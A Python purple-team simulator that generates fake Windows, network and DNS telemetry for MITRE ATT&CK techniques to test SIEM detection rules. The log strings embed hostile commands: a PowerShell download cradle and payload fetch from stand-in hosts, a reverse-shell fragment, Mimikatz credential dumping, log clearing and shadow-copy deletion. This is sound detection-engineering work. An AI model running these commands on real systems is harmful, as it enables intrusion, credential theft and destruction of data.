"""
Guardian SIEM - Purple Team Attack Simulator
==============================================
Generates realistic attack telemetry mapped to MITRE ATT&CK techniques.
Used for:
  - Validating detection rules (YAML + SIGMA)
  - Generating data for incident reports
  - Training SOC analysts on alert triage
  - Demonstrating SIEM capabilities in interviews/demos

Each "atomic test" simulates the *telemetry* an attack would produce,
NOT the attack itself. This is safe to run on any machine.

Events carry no detection labels. When a test runs, every event goes through
the real detection pipeline (detection_pipeline.py) and only the rules that
actually fire produce alerts. detection_validator.py runs the same replay in
CI and fails if a technique stops being detected.

Usage:
    python attack_simulator.py                    # Run all tests
    python attack_simulator.py --technique T1003  # Run specific technique
    python attack_simulator.py --campaign apt29   # Run full campaign
    python attack_simulator.py --list             # List available tests
"""

import os
import sys
import argparse
import time
from datetime import datetime

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from event_bus import EventBus
from detection_pipeline import Detector, publish


class AtomicTest:
    """A single attack technique simulation."""

    def __init__(self, technique_id, technique_name, tactic, description,
                 events, expected_rules=None, severity="HIGH"):
        self.technique_id = technique_id
        self.technique_name = technique_name
        self.tactic = tactic
        self.description = description
        self.events = events  # List of (source, severity, message, enrichment) tuples
        self.expected_rules = expected_rules or []
        self.severity = severity


class AttackSimulator:
    """
    Purple Team attack simulator that generates MITRE ATT&CK-mapped
    telemetry and feeds it into Guardian's event pipeline.
    """

    def __init__(self):
        self.bus = EventBus()
        self.detector = Detector()
        self.tests = {}
        self.campaigns = {}
        self.results = []
        self._register_all_tests()
        self._register_campaigns()

    def _register_all_tests(self):
        """
        Register all available atomic tests.

        Events are written the way the log source records them (Sysmon,
        Security, PowerShell Operational, flow and DNS logs). They carry no
        detection labels: which rules fire is decided by the real engines,
        see detection_validator.py.
        """
        victim = "192.168.1.50"
        c2 = "198.51.100.77"
        ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

        def ev(source, severity, message, src_ip=victim):
            return (source, severity, message, {"src_ip": src_ip})

        # ================================================================
        # T1003 - OS Credential Dumping (Mimikatz / LSASS)
        # ================================================================
        self.tests["T1003"] = AtomicTest(
            technique_id="T1003",
            technique_name="OS Credential Dumping",
            tactic="Credential Access",
            expected_rules=[
                "LSASS Credential Access",
                "SIGMA: LSASS Memory Access - Credential Dumping",
            ],
            description="Simulates Mimikatz opening LSASS memory to extract credentials.",
            severity="CRITICAL",
            events=[
                ev("Windows_EventLog", "HIGH",
                   "Event ID 4672: Special privileges assigned to new logon. "
                   "Subject: CORP\\admin. Privileges: SeDebugPrivilege"),
                ev("Windows_Sysmon", "CRITICAL",
                   "Event ID 10: Process accessed. "
                   "SourceImage: C:\\Users\\admin\\Downloads\\mimikatz.exe. SourceProcessId: 4402. "
                   "TargetImage: C:\\Windows\\System32\\lsass.exe. TargetProcessId: 672. "
                   "GrantedAccess: 0x1010. CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4. "
                   "SourceUser: CORP\\admin"),
                ev("Windows_PowerShell", "CRITICAL",
                   "Event ID 4104: Creating Scriptblock text. "
                   "ScriptBlockText: Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' "
                   "| Out-File C:\\temp\\creds.txt"),
            ],
        )

        # ================================================================
        # T1110 - Brute Force
        # ================================================================
        attacker_ip = "203.0.113.42"
        brute_events = [
            ev("Windows_EventLog", "MEDIUM",
               "Event ID 4625: An account failed to log on. "
               "Subject: NT AUTHORITY\\SYSTEM. Target: CORP\\administrator. "
               f"Logon Type: 10. Source Network Address: {attacker_ip}. "
               "Failure Reason: Unknown user name or bad password",
               src_ip=attacker_ip)
            for _ in range(12)
        ]
        brute_events.append(
            ev("Windows_EventLog", "INFO",
               "Event ID 4624: An account was successfully logged on. "
               f"Target: CORP\\administrator. Logon Type: 10. Source Network Address: {attacker_ip}",
               src_ip=attacker_ip))
        self.tests["T1110"] = AtomicTest(
            technique_id="T1110",
            technique_name="Brute Force",
            tactic="Credential Access",
            expected_rules=[
                "Brute Force Detection",
            ],
            description="Simulates 12 failed RDP logons from one address followed by a success.",
            severity="HIGH",
            events=brute_events,
        )

        # ================================================================
        # T1059.001 - PowerShell Command Execution
        # ================================================================
        self.tests["T1059.001"] = AtomicTest(
            technique_id="T1059.001",
            technique_name="PowerShell",
            tactic="Execution",
            expected_rules=[
                "PowerShell Download Cradle",
                "SIGMA: Encoded PowerShell Command - Base64",
                "SIGMA: Suspicious PowerShell Execution",
            ],
            description="Simulates a PowerShell download cradle and an encoded, hidden PowerShell launch.",
            severity="CRITICAL",
            events=[
                ev("Windows_PowerShell", "HIGH",
                   "Event ID 4104: Creating Scriptblock text. ScriptBlockText: "
                   "IEX(New-Object Net.WebClient).downloadstring('http://evil.example/payload.ps1')"),
                ev("Windows_Sysmon", "HIGH",
                   f"Event ID 1: Process Create. Image: {ps} "
                   "CommandLine: powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient)"
                   ".DownloadString('http://evil.example/payload.ps1')\" "
                   "ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE "
                   "User: CORP\\jsmith"),
                ev("Windows_Sysmon", "HIGH",
                   f"Event ID 1: Process Create. Image: {ps} "
                   "CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwA= "
                   "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith"),
                ev("Windows_PowerShell", "HIGH",
                   "Event ID 4104: Creating Scriptblock text. ScriptBlockText: "
                   "Invoke-WebRequest -Uri 'http://203.0.113.99/beacon.exe' "
                   "-OutFile 'C:\\Users\\Public\\svchost.exe'; "
                   "Start-Process 'C:\\Users\\Public\\svchost.exe' -WindowStyle Hidden"),
            ],
        )

        # ================================================================
        # T1046 - Network Service Scanning
        # ================================================================
        scanner = "192.168.1.100"
        scan_events = [
            ev("Network_Flow", "INFO",
               f"Connection: SrcIp: {scanner}. DstIp: {target}. DstPort: {port}. "
               "Protocol: TCP. Flags: S. Reply: none",
               src_ip=scanner)
            for target in ["10.0.0.1", "10.0.0.2", "10.0.0.5", "10.0.0.10", "10.0.0.20"]
            for port in [22, 80, 443, 445, 3389, 8080, 8443]
        ]
        self.tests["T1046"] = AtomicTest(
            technique_id="T1046",
            technique_name="Network Service Scanning",
            tactic="Discovery",
            expected_rules=[
                "Port Scan Detection",
            ],
            description="Simulates an Nmap-style SYN scan of 7 ports on 5 internal hosts.",
            severity="MEDIUM",
            events=scan_events,
        )

        # ================================================================
        # T1070.001 - Indicator Removal: Clear Windows Event Logs
        # ================================================================
        self.tests["T1070.001"] = AtomicTest(
            technique_id="T1070.001",
            technique_name="Clear Windows Event Logs",
            tactic="Defense Evasion",
            expected_rules=[
                "Log Tampering",
                "SIGMA: Clearing Windows Event Logs",
            ],
            description="Simulates an attacker clearing the Security log with wevtutil.",
            severity="CRITICAL",
            events=[
                ev("Windows_Sysmon", "HIGH",
                   "Event ID 1: Process Create. Image: C:\\Windows\\System32\\wevtutil.exe "
                   "CommandLine: wevtutil cl Security "
                   "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\compromised_admin"),
                ev("Windows_EventLog", "CRITICAL",
                   "Event ID 1102: The audit log was cleared. "
                   "Subject: CORP\\compromised_admin"),
            ],
        )

        # ================================================================
        # T1543.003 - Create or Modify System Process: Windows Service
        # ================================================================
        self.tests["T1543.003"] = AtomicTest(
            technique_id="T1543.003",
            technique_name="Windows Service Persistence",
            tactic="Persistence",
            expected_rules=[
                "SIGMA: Service Installed From a Suspicious Path",
                "Suspicious Service Installation",
            ],
            description="Simulates installing a service that runs a binary from ProgramData.",
            severity="HIGH",
            events=[
                ev("Windows_Sysmon", "HIGH",
                   "Event ID 1: Process Create. Image: C:\\Windows\\System32\\sc.exe "
                   "CommandLine: sc create WindowsUpdateHelper binPath= "
                   "\"C:\\ProgramData\\svchost.exe -k netsvcs\" start= auto "
                   "User: CORP\\compromised_admin"),
                ev("Windows_EventLog", "HIGH",
                   "Event ID 7045: A service was installed in the system. "
                   "Service Name: WindowsUpdateHelper. "
                   "Service File Name: C:\\ProgramData\\svchost.exe -k netsvcs. "
                   "Service Type: user mode service. Service Start Type: auto start. "
                   "Service Account: LocalSystem"),
            ],
        )

        # ================================================================
        # T1041 - Exfiltration Over C2 Channel
        # ================================================================
        self.tests["T1041"] = AtomicTest(
            technique_id="T1041",
            technique_name="Exfiltration Over C2 Channel",
            tactic="Exfiltration",
            expected_rules=[
                "Data Exfiltration Indicator",
            ],
            description="Simulates 847 MB leaving one workstation over HTTPS to an external host.",
            severity="CRITICAL",
            events=[
                ev("Network_Flow", "INFO",
                   f"Flow end: SrcIp: {victim}. DstIp: {c2}. DstPort: 443. Protocol: TCP. "
                   "BytesOut: 888143872. BytesIn: 1048576. Duration: 720"),
            ],
        )

        # ================================================================
        # T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol (DNS)
        # ================================================================
        chunks = [
            "U0VDUkVUOnBheXJvbGwtMjAyNi5jc3YgY2h1bmsgMDEgb2YgMzA",
            "bmFtZSxzc24sc2FsYXJ5LGJhbmtfYWNjb3VudCxyb3V0aW5nX24",
            "YWxpY2UsMDAwLTAwLTAwMDAsOTUwMDAsMDAwMDAwMDAwLDAwMDA",
        ]
        self.tests["T1048.003"] = AtomicTest(
            technique_id="T1048.003",
            technique_name="Exfiltration Over Alternative Protocol: DNS",
            tactic="Exfiltration",
            expected_rules=[
                "DNS Exfiltration",
                "SIGMA: DNS Query With an Encoded Label",
            ],
            description="Simulates a file leaving in base64 chunks packed into DNS query names.",
            severity="HIGH",
            events=[
                ev("Network_DNS", "INFO",
                   f"DNS query: SrcIp: {victim}. QueryName: {chunks[i % 3]}{i:02d}.data.evil-domain.example. "
                   "QueryType: TXT")
                for i in range(12)
            ],
        )

        # ================================================================
        # T1059 - Reverse Shell
        # ================================================================
        self.tests["T1059"] = AtomicTest(
            technique_id="T1059",
            technique_name="Command and Scripting Interpreter",
            tactic="Execution",
            expected_rules=[
                "Reverse Shell Indicator",
                "SIGMA: Reverse Shell Command Patterns",
            ],
            description="Simulates a PowerShell TCP reverse shell to port 4444.",
            severity="CRITICAL",
            events=[
                ev("Windows_Sysmon", "CRITICAL",
                   f"Event ID 1: Process Create. Image: {ps} "
                   "CommandLine: powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient"
                   f"('{c2}',4444);$stream = $client.GetStream();\" "
                   "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith"),
                ev("Network_Flow", "INFO",
                   f"Connection: SrcIp: {victim}. DstIp: {c2}. DstPort: 4444. "
                   "Protocol: TCP. Flags: SA. Reply: established"),
            ],
        )

        # ================================================================
        # T1558.003 - Kerberoasting
        # ================================================================
        self.tests["T1558.003"] = AtomicTest(
            technique_id="T1558.003",
            technique_name="Kerberoasting",
            tactic="Credential Access",
            expected_rules=[
                "Kerberoasting Detection",
                "SIGMA: Kerberoasting - RC4 Service Ticket Request",
            ],
            description="Simulates one user requesting RC4 service tickets for three SPNs.",
            severity="HIGH",
            events=[
                ev("Windows_EventLog", "INFO",
                   "Event ID 4769: A Kerberos service ticket was requested. "
                   f"Account Name: jsmith@CORP.LOCAL. Service Name: {spn}. "
                   f"Ticket Options: 0x40810000. Ticket Encryption Type: 0x17. Client Address: {victim}")
                for spn in ["svc_sql", "svc_web", "svc_backup"]
            ],
        )

        # ================================================================
        # T1021.001 - Remote Desktop Protocol (Lateral Movement)
        # ================================================================
        self.tests["T1021.001"] = AtomicTest(
            technique_id="T1021.001",
            technique_name="Remote Desktop Protocol",
            tactic="Lateral Movement",
            expected_rules=[
                "RDP Lateral Movement",
            ],
            description="Simulates one workstation opening RDP sessions to two servers.",
            severity="HIGH",
            events=[
                ev("Windows_EventLog", "INFO",
                   "Event ID 4624: An account was successfully logged on. "
                   f"Target: CORP\\compromised_admin. Logon Type: 10. Source Network Address: {victim}. "
                   f"Workstation Name: {host}")
                for host in ["DC01", "FILE01"]
            ],
        )

        # ================================================================
        # T1486 - Data Encrypted for Impact (Ransomware)
        # ================================================================
        ransom_proc = "C:\\ProgramData\\svchost.exe"
        docs = "C:\\Users\\Public\\Documents"
        self.tests["T1486"] = AtomicTest(
            technique_id="T1486",
            technique_name="Data Encrypted for Impact",
            tactic="Impact",
            expected_rules=[
                "Ransomware File Encryption",
                "SIGMA: Ransomware File Encryption Activity",
            ],
            description="Simulates shadow copy deletion, files rewritten as .encrypted, and a ransom note.",
            severity="CRITICAL",
            events=[
                ev("Windows_Sysmon", "HIGH",
                   "Event ID 1: Process Create. Image: C:\\Windows\\System32\\vssadmin.exe "
                   "CommandLine: vssadmin delete shadows /all /quiet "
                   f"ParentImage: {ransom_proc} User: CORP\\compromised_admin"),
            ] + [
                ev("Windows_Sysmon", "INFO",
                   f"Event ID 11: File created. Image: {ransom_proc} "
                   f"TargetFilename: {docs}\\{name}.encrypted")
                for name in ["Q3-forecast.xlsx", "payroll.csv", "contract.docx", "board-deck.pptx"]
            ] + [
                ev("Windows_Sysmon", "INFO",
                   f"Event ID 11: File created. Image: {ransom_proc} "
                   f"TargetFilename: {docs}\\README_DECRYPT.txt"),
            ],
        )

    def _register_campaigns(self):
        """Register multi-technique attack campaigns."""

        # APT29 (Cozy Bear) style campaign
        self.campaigns["apt29"] = {
            "name": "APT29 (Cozy Bear) - Full Kill Chain",
            "description": (
                "Simulates an APT29-style intrusion: initial access via phishing, "
                "PowerShell execution, credential dumping, lateral movement, "
                "data collection, and exfiltration."
            ),
            "techniques": [
                "T1059.001",    # PowerShell execution (Initial foothold)
                "T1003",        # Credential dumping (Mimikatz)
                "T1558.003",    # Kerberoasting (Privilege escalation)
                "T1021.001",    # RDP lateral movement
                "T1070.001",    # Clear event logs (Cover tracks)
                "T1041",        # Data exfiltration
            ],
        }

        # Ransomware campaign
        self.campaigns["ransomware"] = {
            "name": "Ransomware Operator - Full Deployment",
            "description": (
                "Simulates a human-operated ransomware attack: brute force entry, "
                "network scanning, persistence, credential theft, and encryption."
            ),
            "techniques": [
                "T1110",        # Brute force RDP
                "T1046",        # Network scanning
                "T1543.003",    # Service persistence
                "T1003",        # Credential dumping
                "T1070.001",    # Cover tracks
                "T1486",        # Ransomware encryption
            ],
        }

        # Insider threat
        self.campaigns["insider"] = {
            "name": "Insider Threat - Data Theft",
            "description": (
                "Simulates a malicious insider with valid credentials performing "
                "reconnaissance and exfiltrating sensitive data."
            ),
            "techniques": [
                "T1046",        # Network scanning
                "T1041",        # Data exfiltration
                "T1048.003",    # DNS exfiltration
                "T1070.001",    # Clear logs
            ],
        }

    def run_test(self, technique_id, delay=0.3):
        """
        Execute a single atomic test, emitting events into the SIEM pipeline.

        Args:
            technique_id: MITRE ATT&CK technique ID (e.g., "T1003")
            delay: Seconds between events (simulates real-time arrival)

        Returns:
            Dict with test results and detection coverage
        """
        test = self.tests.get(technique_id)
        if not test:
            print(f"  [!] Unknown technique: {technique_id}")
            return None

        print(f"\n  {'='*60}")
        print(f"  ATOMIC TEST: {test.technique_id} - {test.technique_name}")
        print(f"  Tactic: {test.tactic}")
        print(f"  Description: {test.description}")
        print(f"  Events to generate: {len(test.events)}")
        print(f"  {'='*60}")

        events_emitted = 0
        rules_fired = set()
        for source, severity, message, enrichment in test.events:
            for match in publish(self.bus, self.detector, source, severity, message, enrichment):
                rules_fired.add(match["rule_name"])
            events_emitted += 1
            if delay > 0:
                time.sleep(delay)

        result = {
            "technique_id": test.technique_id,
            "technique_name": test.technique_name,
            "tactic": test.tactic,
            "events_emitted": events_emitted,
            "expected_rules": test.expected_rules,
            "rules_fired": sorted(rules_fired),
            "severity": test.severity,
            "timestamp": datetime.now().isoformat(),
            "status": "COMPLETED",
        }

        self.results.append(result)
        print(f"  [+] Emitted {events_emitted} events for {test.technique_id}")
        print(f"  [+] Rules fired: {', '.join(sorted(rules_fired)) or 'none'}")
        return result

    def run_campaign(self, campaign_id, delay=0.5):
        """
        Execute a full attack campaign (multiple techniques in sequence).

        Args:
            campaign_id: Campaign identifier (e.g., "apt29")
            delay: Seconds between events

        Returns:
            Dict with campaign results
        """
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            print(f"[!] Unknown campaign: {campaign_id}")
            return None

        print(f"\n{'#'*65}")
        print(f"  CAMPAIGN: {campaign['name']}")
        print(f"  {campaign['description']}")
        print(f"  Techniques: {len(campaign['techniques'])}")
        print(f"{'#'*65}")

        campaign_results = []
        for technique_id in campaign["techniques"]:
            result = self.run_test(technique_id, delay=delay)
            if result:
                campaign_results.append(result)
            time.sleep(1)  # Pause between techniques

        total_events = sum(r["events_emitted"] for r in campaign_results)
        summary = {
            "campaign": campaign["name"],
            "techniques_executed": len(campaign_results),
            "total_events": total_events,
            "timestamp": datetime.now().isoformat(),
            "results": campaign_results,
        }

        print(f"\n  {'='*60}")
        print(f"  CAMPAIGN COMPLETE: {campaign['name']}")
        print(f"  Techniques: {len(campaign_results)}")
        print(f"  Total Events: {total_events}")
        print(f"  {'='*60}")

        return summary

    def run_all_tests(self, delay=0.2):
        """Execute all registered atomic tests."""
        print("\n" + "=" * 65)
        print("  GUARDIAN SIEM - PURPLE TEAM: Full Test Suite")
        print("=" * 65)

        for technique_id in sorted(self.tests.keys()):
            self.run_test(technique_id, delay=delay)

        total = sum(r["events_emitted"] for r in self.results)
        print(f"\n  SUITE COMPLETE: {len(self.results)} techniques, {total} events emitted")
        return self.results

    def list_tests(self):
        """Print all available atomic tests and campaigns."""
        print("\n  Available Atomic Tests:")
        print("  " + "-" * 55)
        for tid in sorted(self.tests.keys()):
            t = self.tests[tid]
            print(f"    {t.technique_id:<15} {t.technique_name:<35} [{t.tactic}]")

        print(f"\n  Available Campaigns:")
        print("  " + "-" * 55)
        for cid, c in self.campaigns.items():
            print(f"    {cid:<15} {c['name']}")
            print(f"                    Techniques: {', '.join(c['techniques'])}")

    def get_detection_coverage(self):
        """
        Replay every atomic test through the real detection engines and report
        which techniques are caught. See detection_validator.py.
        """
        from detection_validator import validate_techniques

        techniques = validate_techniques(self)
        detected_count = sum(1 for t in techniques if t["status"] == "DETECTED")
        return {
            "total_techniques": len(techniques),
            "detected": detected_count,
            "gaps": len(techniques) - detected_count,
            "overall_coverage": round(detected_count / len(techniques) * 100, 1) if techniques else 0,
            "techniques": techniques,
        }


def main():
    parser = argparse.ArgumentParser(
        description="Guardian SIEM - Purple Team Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python attack_simulator.py --list                 List all tests and campaigns
  python attack_simulator.py --all                  Run all atomic tests
  python attack_simulator.py --technique T1003      Run credential dumping test
  python attack_simulator.py --campaign apt29       Run APT29 kill chain
  python attack_simulator.py --campaign ransomware  Run ransomware campaign
  python attack_simulator.py --coverage             Show detection coverage report
        """
    )
    parser.add_argument("--technique", "-t", help="Run a specific MITRE technique (e.g., T1003)")
    parser.add_argument("--campaign", "-c", help="Run an attack campaign (e.g., apt29, ransomware)")
    parser.add_argument("--all", "-a", action="store_true", help="Run all atomic tests")
    parser.add_argument("--list", "-l", action="store_true", help="List available tests and campaigns")
    parser.add_argument("--coverage", action="store_true", help="Show detection coverage report")
    parser.add_argument("--delay", "-d", type=float, default=0.2, help="Delay between events (seconds)")

    args = parser.parse_args()
    sim = AttackSimulator()

    print("\n" + "=" * 65)
    print("  Guardian SIEM - Purple Team Attack Simulator")
    print("  Generates MITRE ATT&CK-mapped telemetry for detection validation")
    print("=" * 65)

    if args.list:
        sim.list_tests()
    elif args.technique:
        sim.run_test(args.technique, delay=args.delay)
    elif args.campaign:
        sim.run_campaign(args.campaign, delay=args.delay)
    elif args.coverage:
        report = sim.get_detection_coverage()
        if "error" in report:
            print(f"\n  [!] {report['error']}")
        else:
            print(f"\n  Detection Coverage Report")
            print(f"  {'='*55}")
            print(f"  Total Techniques: {report['total_techniques']}")
            print(f"  Detected:         {report['detected']}")
            print(f"  Gaps:             {report['gaps']}")
            print(f"  Coverage:         {report['overall_coverage']}%")
            print(f"\n  {'Technique':<15} {'Name':<45} {'Status':<8} Detected by")
            print(f"  {'-'*15} {'-'*45} {'-'*8} {'-'*30}")
            for t in report["techniques"]:
                status_icon = "PASS" if t["status"] == "DETECTED" else "FAIL"
                print(f"  {t['technique_id']:<15} {t['technique_name']:<45} {status_icon:<8} "
                      f"{', '.join(t['detected_by']) or '-'}")
    elif args.all:
        sim.run_all_tests(delay=args.delay)
        print("\n  Run --coverage to see detection results.")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
